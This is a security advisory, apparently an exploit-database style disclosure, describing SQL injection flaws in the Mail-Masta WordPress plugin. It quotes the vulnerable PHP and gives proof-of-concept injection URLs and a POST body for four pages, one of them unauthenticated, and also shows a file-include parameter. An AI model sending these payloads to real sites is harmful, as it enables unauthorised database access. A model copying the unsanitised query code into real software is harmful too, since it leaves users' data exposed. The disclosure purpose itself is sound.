Mail-Masta SQL Injection
=========================================
Page: ../wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated)

GET Parameter: list_id

    http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php


csvexport.php:

    $list_id=$_GET['list_id'];
    global $wpdb;
    $mail_subscribers = $wpdb->prefix . "masta_subscribers";
    $masta_list = $wpdb->prefix . "masta_list";
    $check_sql = "SELECT * FROM $mail_subscribers WHERE list_id = $list_id";
    $check_list="SELECT * FROM $masta_list WHERE list_id= $list_id";
    $wp_list=$wpdb->get_results($check_sql);
    $wp_list_s=$wpdb->get_results($check_list);



=========================================

Page: ../wp-content/plugins/mail-masta/inc/lists/view-list.php (Requires Wordpress admin)

GET Parameter: filter_list

    http://my_wp_app/wp-admin/admin.php?page=masta-lists&action=view_list&filter_list=0+OR+1%3D1


view-list.php:

    global $wpdb;
    $list_id = $_GET['filter_list'];
    $masta_list = $wpdb->prefix . "masta_list";
    $masta_subscribers = $wpdb->prefix . "masta_subscribers";
    $listdata = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $masta_list WHERE list_id= $list_id",$query));
    $list_subscribers = $wpdb->get_var( $wpdb->prepare("SELECT COUNT( `list_id` ) FROM $masta_subscribers WHERE list_id= $list_id AND status=1",$query));

=========================================

Page: ../wp-content/plugins/mail-masta/inc/campaign/count_of_send.php (Requires Wordpress admin)

POST Parameter: camp_id

    http://my_wp_app/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=/var/www/html/wordpress/wp-load.php


count_of_send.php:

    include($_GET['pl']);
    global $wpdb;
    $camp_id=$_POST['camp_id'];
    $masta_reports = $wpdb->prefix . "masta_reports";
    $count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");


=========================================


Page: ../wp-content/plugins/mail-masta/inc/campaign_save.php (Requires Wordpress admin)

POST Parameter: list_id

campaign_save.php:

    $list_id=$_POST['list_id'];
    $check_list = $wpdb->get_var("SELECT count(id) FROM wp_masta_subscribers where list_id=$list_id");


POST /wp-admin/admin-ajax.php?id= HTTP/1.1

...snip...

action=my_action&url=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fplugins%2Fmail-masta%2Finc%2Fcampaign_save.php&sender_selected_list_check=check&list_id=1+OR+1%3D1

=========================================
